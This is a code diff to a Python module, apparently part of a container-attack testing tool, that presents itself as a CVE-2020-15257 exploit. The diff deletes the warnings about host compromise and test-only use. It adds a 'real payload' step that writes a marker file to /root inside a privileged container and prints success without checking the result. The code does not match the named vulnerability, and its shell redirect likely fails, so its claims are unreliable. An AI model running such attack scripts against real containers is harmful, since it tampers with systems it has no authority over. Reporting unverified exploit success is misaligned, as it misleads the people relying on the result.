@@ -4,20 +4,18 @@ def run(container, simulate=False):
     print("[*] Running CVE-2020-15257 exploit...")
 
     if simulate:
-        # Simulated execution: no file system changes
         print(f"[SIMULATE] Would attempt to overwrite root filesystem inside privileged container '{container.name}'")
+        print("[SIMULATE] Example payload: write /root/pwned_by_15257.txt")
         return "Simulated run: No changes made."
 
     try:
-        # ⚠️ WARNING: Privileged Container Root Filesystem Overwrite
-        # This exploit targets containers running in privileged mode to overwrite the root filesystem.
-        # If successful, it can allow full host compromise depending on mount configuration.
-        # Note: Should only be run in controlled testing environments.
+        # ⚠️ REAL PAYLOAD EXECUTION
+        # Write to root-owned path, requires --privileged container
+        command = "echo 'pwned by CVE-2020-15257' > /root/pwned_by_15257.txt"
+        container.exec_run(command, privileged=True)
 
-        print(f"[!] WARNING: Attempting to overwrite container root filesystem")
-        exec_result = container.exec_run("echo 'root overwrite attempt' > /root/pwned.txt", privileged=True)
-        print(f"[+] Exploit attempted. Output: {exec_result.output.decode()}")
-        return "Executed: Attempted to overwrite root filesystem"
+        print("[+] Payload written to /root/pwned_by_15257.txt")
+        return "Executed: root FS modified"
 
     except Exception as e:
         print(f"[!] Exploit failed: {e}")
